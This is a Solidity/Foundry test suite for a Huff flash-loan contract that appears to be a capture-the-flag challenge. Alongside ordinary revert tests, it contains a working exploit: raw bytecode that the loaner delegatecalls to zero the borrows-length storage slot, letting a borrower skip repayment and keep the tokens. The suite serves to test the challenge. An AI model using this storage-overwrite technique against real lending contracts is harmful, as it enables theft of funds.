// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "foundry-huff/HuffDeployer.sol";
import { Token } from "../src/Token.sol";
import { MockBaseBorrower } from "./mocks/MockBaseBorrower.sol";
import { MockAdversaryBorrower } from "./mocks/MockAdversaryBorrower.sol";
import { MockReentrantBorrower } from "./mocks/MockReentrantBorrower.sol";
import { IFlashLoanReceiver } from "../src/interfaces/IFlashLoanReceiver.sol";
import { ITransientLoan } from "../src/interfaces/ITransientLoan.sol";

contract TransientLoanTest is Test {
    ////////////////////////////////////////////////////////////////
    //                           STATE                            //
    ////////////////////////////////////////////////////////////////

    uint256 constant MAX_BORROW = 1000;

    ITransientLoan flashLoaner;
    Token mockToken;
    MockBaseBorrower mockBaseBorrower;
    MockReentrantBorrower mockReentrantBorrower;
    MockAdversaryBorrower mockAdversaryBorrower;

    ////////////////////////////////////////////////////////////////
    //                           ERRORS                           //
    ////////////////////////////////////////////////////////////////

    error RejectBorrower(string);
    error OutstandingDebt(string);
    error ExceedsLoanThreshold();
    error NoReentrancy();

    error NotTheMinter();

    ////////////////////////////////////////////////////////////////
    //                           SETUP                            //
    ////////////////////////////////////////////////////////////////

    function setUp() public {
        // Deploy mock token
        mockToken = new Token("MOCK", "MCK", 18);

        // Deploy [TransientLoan] contract.
        flashLoaner = ITransientLoan(
            HuffDeployer.config().with_addr_constant("TOKEN", address(mockToken)).deploy("TransientLoan")
        );
        // Label [TransientLoan] contract in traces.
        vm.label(address(flashLoaner), "TransientLoan");

        // Mint max uint tokens to the [TransientLoan] contract.
        mockToken.mint(address(flashLoaner), type(uint256).max);

        // Deploy mock borrowers
        mockBaseBorrower = new MockBaseBorrower(flashLoaner, mockToken);
        mockReentrantBorrower = new MockReentrantBorrower(
            flashLoaner,
            mockToken
        );
        mockAdversaryBorrower = new MockAdversaryBorrower(
            flashLoaner,
            mockToken
        );
    }

    ////////////////////////////////////////////////////////////////
    //                        TOKEN TESTS                         //
    ////////////////////////////////////////////////////////////////

    /// @notice Tests whether or not an EOA other than the owner can mint
    /// the loaned token.
    function test_mint_notMinter_reverts() public {
        vm.prank(address(0xbeef));
        vm.expectRevert(NotTheMinter.selector);
        mockToken.mint(address(this), type(uint256).max);
    }

    ////////////////////////////////////////////////////////////////
    //                    BASE BORROWER TESTS                     //
    ////////////////////////////////////////////////////////////////

    /// @notice Tests whether or not a loan will succeed if we repay our
    /// outstanding debt.
    function test_startLoan_repayDebt_success() public {
        // We want to repay our loans
        mockBaseBorrower.setRepay(true);

        // Initialize a flash loan call frame
        // The `MockBaseBorrower` contract's `bankroll` function will be called, and
        // loans can be taken out within that callframe by that contract.
        mockBaseBorrower.performHonestLoan();
    }

    /// @notice Tests whether or not a loan will revert if we do not repay
    /// our outstanding debt.
    function test_startLoan_noRepay_reverts() public {
        // Initialize a flash loan call frame
        // The `MockBaseBorrower` contract's `bankroll` function will be called, and
        // loans can be taken out within that callframe by that contract.

        // This call will fail because we do not repay our loans.
        vm.expectRevert(abi.encodeWithSelector(OutstandingDebt.selector, "Repay your debt!"));
        mockBaseBorrower.performHonestLoan();
    }

    /// @notice Tests whether or not a call to `borrow` will revert if we
    /// have not initiated a transient loan callframe.
    function test_borrow_noLoan_reverts(uint256 amount) public {
        vm.assume(amount <= MAX_BORROW);

        // Attempt to borrow from outside of an approved callframe
        // Should revert every time.
        (bool success, bytes memory returndata) = address(flashLoaner).call(
            abi.encodePacked(bytes4(ITransientLoan.borrow.selector), mockToken, amount, address(this))
        );
        assert(!success);
        assertEq(returndata, abi.encodeWithSelector(RejectBorrower.selector, "Not the borrower!"));
    }

    ////////////////////////////////////////////////////////////////
    //                  REENTRANT BORROWER TESTS                  //
    ////////////////////////////////////////////////////////////////

    /// @notice Tests whether or not a reentrant call to `startLoan`
    /// will revert.
    function test_startLoan_reenters_reverts() public {
        vm.expectRevert(NoReentrancy.selector);
        mockReentrantBorrower.performReentrantLoan();
    }

    ////////////////////////////////////////////////////////////////
    //                  ADVERSARY BORROWER TESTS                  //
    ////////////////////////////////////////////////////////////////

    /// @notice Tests whether or not a call to the [TransientLoan] contract's
    /// externally facing delegatecall fails if the calling EOA is not set
    /// to the transient borrower slot
    function test_delegatecall_notTheBorrower_reverts() public {
        address _exploit = deployExploitContract();

        // Call the flash loaner contract's delegatecall logic with our exploit contract.
        bytes32 param;
        assembly {
            // Store this contract's address in memory @ 0x00
            mstore(0x00, address())
            // Assign our param's value
            param := or(shl(0x60, _exploit), and(keccak256(0x00, 0x20), 0xFFFFFFFF))
        }
        (bool success, bytes memory returndata) = address(flashLoaner).call(abi.encodePacked(bytes4(uint32(1)), param));
        assert(!success);
        assertEq(returndata, abi.encodeWithSelector(RejectBorrower.selector, "Not the borrower!"));
    }

    /// @notice Tests whether or not a call to the [TransientLoan] contract's
    /// externally facing delegatecall fails if the calldata is incorrect.
    function test_delegatecall_incorrectCalldata_reverts() public {
        address _exploit = deployExploitContract();

        // Call the flash loaner contract's delegatecall logic with our exploit contract.
        bytes32 param;
        assembly {
            // Store this contract's address in memory @ 0x00
            mstore(0x00, address())
            // Assign our param's value
            param := or(shl(0x60, _exploit), and(address(), 0xFFFFFFFF))
        }
        (bool success, bytes memory returndata) = address(flashLoaner).call(abi.encodePacked(bytes4(uint32(1)), param));
        assert(!success);
        assertEq(returndata, hex"");
    }

    /// @notice Tests the adversarial borrower's exploit.
    function test_startLoan_exploit_success() public {
        // Initiate the flash loan exploit
        //
        // Inside of the loan callframe, the adversarial contract deploys a new contract
        // that will be delegatecalled by the flashloaner. This contract should zero-out
        // the transient storage slot containing the length of the `borrows` array, allowing
        // them to completely bypass the debt collection process and keep their loaned tokens.
        mockAdversaryBorrower.exploit();

        // Ensure that the adversarial borrower kept the tokens and then solved the challenge.
        vm.prank(address(mockAdversaryBorrower));
        assertTrue(flashLoaner.isSolved());
    }

    function deployExploitContract() internal returns (address _exploit) {
        // Deploy contract to overwrite borrow length storage slot
        // PUSH1 0
        // PUSH1 1
        // SSTORE (todo: TSTORE)
        bytes memory exploitCode = hex"60058060093d393df36000600155";
        assembly {
            _exploit := create(0x00, add(exploitCode, 0x20), mload(exploitCode))
        }
    }
}
